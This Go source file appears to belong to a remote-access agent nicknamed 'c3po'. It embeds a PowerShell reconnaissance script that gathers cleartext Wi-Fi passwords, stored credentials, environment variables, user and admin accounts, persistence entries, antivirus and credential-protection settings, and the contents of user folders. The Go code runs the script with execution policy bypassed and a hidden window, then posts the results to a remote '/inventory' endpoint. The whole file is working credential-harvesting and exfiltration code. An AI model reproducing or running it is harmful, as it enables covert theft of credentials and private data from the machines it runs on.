package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

// inventoryPS is the PowerShell script run on each node to collect full system state.
// It mirrors c3po-recon.ps1 but targets the NODE server (HTTP, no TLS bypass needed).
const inventoryPS = `
$ErrorActionPreference = 'SilentlyContinue'
$nl = [char]10
$out = @{}

# meta
$out.meta = @{
    hostname      = $env:COMPUTERNAME
    username      = $env:USERNAME
    domain        = (Get-WmiObject Win32_ComputerSystem).Domain
    is_admin      = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
    collected_at  = (Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')
    os_arch       = $env:PROCESSOR_ARCHITECTURE
}

# OS
$os = Get-WmiObject Win32_OperatingSystem
$out.os = @{
    caption      = $os.Caption
    version      = $os.Version
    build        = $os.BuildNumber
    install_date = $os.InstallDate
    last_boot    = $os.LastBootUpTime
    serial       = $os.SerialNumber
}

# Hardware
$cpu  = Get-WmiObject Win32_Processor | Select-Object Name,NumberOfCores,MaxClockSpeed | ConvertTo-Json -Compress
$ram  = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,2)
$disks = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} |
         Select-Object DeviceID,@{N='SizeGB';E={[math]::Round($_.Size/1GB,1)}},@{N='FreeGB';E={[math]::Round($_.FreeSpace/1GB,1)}} |
         ConvertTo-Json -Compress
$gpu  = Get-WmiObject Win32_VideoController | Select-Object Name,AdapterRAM | ConvertTo-Json -Compress
$bios = Get-WmiObject Win32_BIOS | Select-Object Manufacturer,Name,SerialNumber,Version | ConvertTo-Json -Compress
$out.hardware = @{
    cpu=$cpu; ram_gb=$ram; disks=$disks; gpu=$gpu; bios=$bios
}

# Network
$adapters = Get-NetIPConfiguration | Where-Object {$_.IPv4Address} |
    Select-Object InterfaceAlias,@{N='IPv4';E={$_.IPv4Address.IPAddress}},
                  @{N='MAC';E={(Get-NetAdapter -Name $_.InterfaceAlias -EA SilentlyContinue).MacAddress}},
                  @{N='Gateway';E={$_.IPv4DefaultGateway.NextHop}} | ConvertTo-Json -Compress
$dns_servers = (Get-DnsClientServerAddress -AddressFamily IPv4).ServerAddresses -join ','
$listening   = netstat -an | Select-String 'LISTENING' | ForEach-Object { $_.Line.Trim() }
$wifi_profiles = (netsh wlan show profiles 2>$null) | Select-String 'All User Profile' |
    ForEach-Object { ($_ -replace '.*: ','').Trim() }
$wifi_creds = foreach ($p in $wifi_profiles) {
    $d = netsh wlan show profile name="$p" key=clear 2>$null
    $key = ($d | Select-String 'Key Content').ToString() -replace '.*: ',''
    @{ssid=$p; key=$key.Trim()}
}
$arp = arp -a
$out.network = @{
    adapters=$adapters; dns=$dns_servers
    listening_ports=($listening -join $nl)
    wifi_profiles=($wifi_profiles -join ',')
    wifi_creds=($wifi_creds | ConvertTo-Json -Compress -Depth 3)
    arp=($arp -join $nl)
}

# Identity
$users    = Get-LocalUser | Select-Object Name,Enabled,LastLogon | ConvertTo-Json -Compress
$admins   = (Get-LocalGroupMember Administrators -EA SilentlyContinue).Name -join ','
$sessions = query session 2>$null
$cmdkey   = cmdkey /list
$out.identity = @{
    local_users=$users; admin_members=$admins
    sessions=($sessions -join $nl); cmdkey=($cmdkey -join $nl)
}

# Persistence
$runHKLM   = Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -EA SilentlyContinue
$runHKCU   = Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -EA SilentlyContinue
$run32HKLM = Get-ItemProperty 'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run' -EA SilentlyContinue
$schtasks  = Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\Microsoft\*'} |
             Select-Object TaskName,TaskPath,State | ConvertTo-Json -Compress
$services  = Get-Service | Where-Object {$_.StartType -eq 'Automatic'} |
             Select-Object Name,DisplayName,Status | ConvertTo-Json -Compress
$wmi_subs  = Get-WMIObject -Namespace root\subscription -Class __EventFilter -EA SilentlyContinue |
             Select-Object Name,Query | ConvertTo-Json -Compress
$startup   = (Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -EA SilentlyContinue).FullName -join ','
$out.persistence = @{
    run_hklm=($runHKLM | ConvertTo-Json -Compress)
    run_hkcu=($runHKCU | ConvertTo-Json -Compress)
    run_hklm_32=($run32HKLM | ConvertTo-Json -Compress)
    scheduled_tasks=$schtasks; services=$services
    wmi_subscriptions=$wmi_subs; startup_folder=$startup
}

# Security
$defender  = Get-MpComputerStatus -EA SilentlyContinue | Select-Object RealTimeProtectionEnabled,AntivirusEnabled,AntivirusSignatureLastUpdated
$excl      = Get-MpPreference -EA SilentlyContinue | Select-Object ExclusionPath,ExclusionProcess
$firewall  = Get-NetFirewallProfile | Select-Object Name,Enabled | ConvertTo-Json -Compress
$uac       = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -EA SilentlyContinue).EnableLUA
$rdp       = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -EA SilentlyContinue).fDenyTSConnections
$smb1      = (Get-SmbServerConfiguration -EA SilentlyContinue).EnableSMB1Protocol
$bitlocker = manage-bde -status C: 2>$null
$lsaFlags  = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -EA SilentlyContinue).LsaCfgFlags
$wdigest   = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -EA SilentlyContinue).UseLogonCredential
$av        = Get-WmiObject -Namespace 'root\SecurityCenter2' -Class AntiVirusProduct -EA SilentlyContinue |
             Select-Object DisplayName | ConvertTo-Json -Compress
$out.security = @{
    defender=($defender | ConvertTo-Json -Compress)
    defender_exclusions=($excl | ConvertTo-Json -Compress)
    firewall=$firewall; uac_enabled=$uac; rdp_disabled=$rdp
    smb1_enabled=$smb1; lsass_ppl=$lsaFlags; wdigest=$wdigest
    av_products=$av
    bitlocker=($bitlocker -join $nl)
}

# Installed Software
$sw64  = Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' -EA SilentlyContinue |
         Select-Object DisplayName,DisplayVersion,Publisher | Where-Object {$_.DisplayName} | ConvertTo-Json -Compress
$sw32  = Get-ItemProperty 'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -EA SilentlyContinue |
         Select-Object DisplayName,DisplayVersion,Publisher | Where-Object {$_.DisplayName} | ConvertTo-Json -Compress
$out.software = @{ installed_64=$sw64; installed_32=$sw32 }

# Running Processes
$procs = Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 30 |
         Select-Object Name,Id,CPU,@{N='MemMB';E={[math]::Round($_.WorkingSet/1MB,1)}},Path |
         ConvertTo-Json -Compress
$out.processes = $procs

# Environment Variables (sensitive filter)
$envVars = [System.Environment]::GetEnvironmentVariables() |
    ConvertTo-Json -Compress
$out.env_vars = $envVars

# User Data locations
$out.user_data = @{
    profile   = $env:USERPROFILE
    appdata   = $env:APPDATA
    localapp  = $env:LOCALAPPDATA
    desktop   = (Get-ChildItem "$env:USERPROFILE\Desktop" -EA SilentlyContinue | Select-Object Name,Length,LastWriteTime | ConvertTo-Json -Compress)
    documents = (Get-ChildItem "$env:USERPROFILE\Documents" -EA SilentlyContinue | Select-Object Name,Length,LastWriteTime | ConvertTo-Json -Compress)
    downloads = (Get-ChildItem "$env:USERPROFILE\Downloads" -EA SilentlyContinue | Select-Object Name,Length,LastWriteTime | ConvertTo-Json -Compress)
}

$out | ConvertTo-Json -Depth 5 -Compress
`

func runInventory(nodeURL string) {
	if runtime.GOOS != "windows" {
		return
	}

	out, err := runPSScript(inventoryPS)
	if err != nil || len(out) < 10 {
		return
	}

	// Verify it's valid JSON
	var raw json.RawMessage
	if json.Unmarshal([]byte(out), &raw) != nil {
		return
	}

	// Wrap with agent_id
	type InventoryPayload struct {
		AgentID string          `json:"agent_id"`
		Data    json.RawMessage `json:"data"`
	}
	payload, _ := json.Marshal(InventoryPayload{AgentID: agentID, Data: raw})

	client := &http.Client{Timeout: 30 * time.Second}
	client.Post(nodeURL+"/inventory", "application/json", bytes.NewReader(payload))
}

func runPSScript(script string) (string, error) {
	// Write to temp file to avoid length limits on -Command
	tmp, err := os.CreateTemp("", "c3po-*.ps1")
	if err != nil {
		return "", err
	}
	defer os.Remove(tmp.Name())
	fmt.Fprint(tmp, script)
	tmp.Close()

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-ExecutionPolicy", "Bypass", "-File", tmp.Name())
	hideWindow(cmd)
	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	err = cmd.Run()
	return buf.String(), err
}
